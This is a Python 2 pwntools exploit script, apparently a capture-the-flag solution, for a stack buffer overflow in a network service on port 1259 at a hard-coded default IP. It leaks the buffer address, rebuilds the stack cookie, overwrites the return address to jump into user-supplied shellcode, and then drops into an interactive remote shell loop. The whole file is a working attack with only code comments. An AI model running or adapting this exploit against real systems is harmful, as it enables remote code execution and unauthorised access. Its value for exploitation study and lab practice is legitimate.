#!/usr/bin/env python2
from pwn import *
import argparse
import sys
from multiprocessing import Process

SC_OFFSET = 128
IP_OFFSET = 148
STACK_COOKIE = '\xa5\x31\x5a\x47\x55\x15\x50\x40'

ap = argparse.ArgumentParser()
ap.add_argument('PAYLOAD', type=argparse.FileType('r'))
ap.add_argument('--stack-cookie-offset', default=SC_OFFSET, type=int)
ap.add_argument('--instruction-pointer-offset', default=IP_OFFSET, type=int)
ap.add_argument('--stack-cookie', default=STACK_COOKIE, type=str)
ap.add_argument('-r', '--buffer-address', type=str)
ap.add_argument('-s', '--shellcode-offset', type=str)
ap.add_argument('--remote', type=str, default="54.173.98.115")



def splice_into_payload(payload, offset, splice):
    _p = []
    _p.append(payload[:offset])
    _p.append(splice)
    _p.append(payload[offset + len(splice):])
    return "".join(_p)


def make_payload(buf_address, ip_offset, sc_offset, sc_value, shellcode):
    _buf_address = int(buf_address, 16)
    _shell_offset = ip_offset + 16

    # Compute and pack the return address
    _ret_addr = pack(
        _buf_address + _shell_offset,
        32, 'little', False
    )

    # I used a cyclic patter to find the offsets. just left it here.
    payload = cyclic(1000)

    # Add stack cookie
    payload = splice_into_payload(
        payload,
        sc_offset,
        sc_value
    )

    # Add ret address
    payload = splice_into_payload(
        payload,
        ip_offset,
        _ret_addr
    )

    # add the shellcode
    payload = splice_into_payload(
        payload,
        _shell_offset,
        shellcode
    )

    # the server expects a \n to stop reading.
    return "".join([payload, "\n"])


def t(soc):
    # Just loop forever and print watever the server sends back
    while True:
        sys.stdout.write(soc.recvn(1))

if __name__ == "__main__":
    # Originally i was playing with offsets so much of these options are 
    # not really needed. But --remote can be used to point at a local copy
    # of the service, PAYLOAD is required (shellcode)
    args = ap.parse_args(sys.argv[1:])
    shellcode = args.PAYLOAD.read()

    # Connect
    r = remote(args.remote, "1259")

    # The server sends back "Buff: 0x--------"
    # Read the first 6 bytes and trash them.
    r.recvn(6)

    # The next 10 bytes is the address of the input buffer. (handy right?)
    b = r.recvn(10)
    print "Buffer Location: {}".format(b)

    # If you would like to attach a debuger to the local process....
    x = raw_input('Press enter when ready')

    # construct the payload
    payload = make_payload(
        b,
        args.instruction_pointer_offset,
        args.stack_cookie_offset,
        args.stack_cookie,
        shellcode
    )

    # Exploit it!
    r.send(payload)

    # To be lazy, pop another thread that just reads from the socket
    p = Process(target=t, args=(r,))
    p.start()

    # Read anything typed and send it up to the server
    while True:
        x = raw_input("(remote) >> ")
        r.send("".join([x, "\n"]))
